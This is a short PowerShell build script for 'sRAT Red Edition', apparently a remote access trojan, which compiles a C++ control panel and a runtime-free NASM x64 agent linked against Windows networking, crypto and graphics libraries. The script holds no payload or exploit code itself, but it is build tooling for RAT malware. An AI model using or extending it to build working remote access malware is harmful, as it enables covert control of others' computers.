# sRAT Red Edition build: panel (C++) + agent (NASM x64, no CRT)
# usage: powershell -File build.ps1
$ErrorActionPreference = "Stop"

$flags = "-std=c++17 -Os -s -w -DNOMINMAX -fno-exceptions -fno-rtti"
$libs  = "-static -mwindows -lws2_32 -lsecur32 -lcrypt32 -lcomctl32 -lgdi32 -lwininet -ladvapi32 -liphlpapi"

Write-Host "panel..."
& x86_64-w64-mingw32-g++ $flags.Split(' ') panel/panel.cpp -o panel.exe $libs.Split(' ')
if ($LASTEXITCODE) { exit $LASTEXITCODE }

Write-Host "agent (nasm)..."
nasm -f win64 asm/agent.asm -o asm/asm-agent.obj
if ($LASTEXITCODE) { exit $LASTEXITCODE }
& x86_64-w64-mingw32-g++ -nostdlib -nostartfiles -o asm/asm-agent.exe asm/asm-agent.obj `
  -lkernel32 -lws2_32 -lsecur32 -lcrypt32 -ladvapi32 -luser32 -lgdi32 `
  "-Wl,-e,start" "-Wl,--subsystem,console"
exit $LASTEXITCODE
